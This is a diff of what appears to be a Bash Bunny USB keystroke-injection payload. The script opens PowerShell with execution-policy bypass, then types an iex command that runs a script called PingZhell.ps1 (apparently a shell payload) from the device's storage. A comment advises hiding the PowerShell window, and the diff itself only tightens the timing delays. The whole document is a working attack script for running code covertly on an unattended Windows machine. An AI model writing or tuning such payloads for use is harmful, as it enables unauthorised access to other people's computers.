@@ -9,12 +9,12 @@
 
 LED SETUP
 
-DELAY 500
+Q DELAY 500
 
 GET SWITCH_POSITION
 DUCKY_LANG de
 
-DELAY 500
+Q DELAY 500
 
 ATTACKMODE HID STORAGE
 
@@ -23,16 +23,16 @@ ATTACKMODE HID STORAGE
 LED STAGE1
 
 #After you have adapted the delays for your target, add "-W hidden"
-DELAY 5000
+Q DELAY 1500
 RUN WIN "powershell -Exec Bypass -NoP -NonI"
-DELAY 6000
+Q DELAY 500
 Q ENTER
 
-DELAY 20000
+Q DELAY 1000
 Q STRING "iex((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\PingZhell.ps1')"
-DELAY 20000
+Q DELAY 3000
 Q ENTER
-DELAY 15000
+Q DELAY 1000
 
 ATTACKMODE HID
 
